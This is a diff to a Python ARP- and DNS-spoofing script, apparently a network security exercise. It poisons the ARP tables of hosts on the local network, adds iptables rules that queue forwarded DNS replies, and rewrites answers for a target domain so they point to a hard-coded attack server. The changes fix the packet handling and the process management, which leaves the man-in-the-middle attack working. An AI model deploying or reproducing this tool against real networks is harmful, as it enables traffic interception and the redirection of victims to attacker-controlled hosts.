@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 
+from os import system
 import netifaces as ni
 from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR
 from netfilterqueue import NetfilterQueue
 from math import log2
 import time
-import threading
-from netfilterqueue import NetfilterQueue
 
+#import threading
+import multiprocessing
+
+from netfilterqueue import NetfilterQueue
 
 arp_table = {}
 hot_ip = None
@@ -70,7 +73,7 @@ attack_server = '140.113.207.237'
 def callback(pkt):
 	spkt = IP(pkt.get_payload())
 
-	if spkt[DNSQR].qname == b'{target_domain}':
+	if spkt[DNSQR].qname == target_domain.encode('ascii'):
 		
 		response = DNSRR(rrname = target_domain, rdata = attack_server)
 		
@@ -83,32 +86,32 @@ def callback(pkt):
 		del spkt[UDP].chksum
 
 		print("Got one target DNS query!")
-		pkt.set_payload(str(spkt))
+		pkt.set_payload(bytes(spkt))
 
 	pkt.accept()
 	return
 
-
 def fake_dns():
+	global closing
+
 	system('iptables -I FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
-    system('iptables -I FORWARD -j REJECT -p tcp --sport 53')
+	system('iptables -I FORWARD -j REJECT -p tcp --sport 53')
 
 	queue = NetfilterQueue()
 	queue.bind(23, callback)
-
 	try:
-        queue.run()
-    except KeyboardInterrupt:
-		system('iptables -D FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
-		system('iptables -D FORWARD -j REJECT -p tcp --sport 53')
-		exit(0)
-
+		queue.run()
+	except KeyboardInterrupt:
+		queue.unbind()
+		print("\n\nUnbind successfully!")
+	return
 
 def main():
 	arp_scan()
 	send_fake_arp()
 
-	trd = threading.Thread(target = fake_dns)
+# trd = threading.Thread(target = fake_dns)
+	trd = multiprocessing.Process(target = fake_dns, args=())
 	trd.start()
 
 	while True:
@@ -116,9 +119,12 @@ def main():
 			send_fake_arp()
 			time.sleep(2)
 		except KeyboardInterrupt:
+			system('iptables -D FORWARD -j NFQUEUE --queue-num 23 -p udp --sport 53')
+			system('iptables -D FORWARD -j REJECT -p tcp --sport 53')
+			trd.terminate()
 			break	
-
-	trd.join()
+	
+	print('Closing program...')
 	return 
 
 
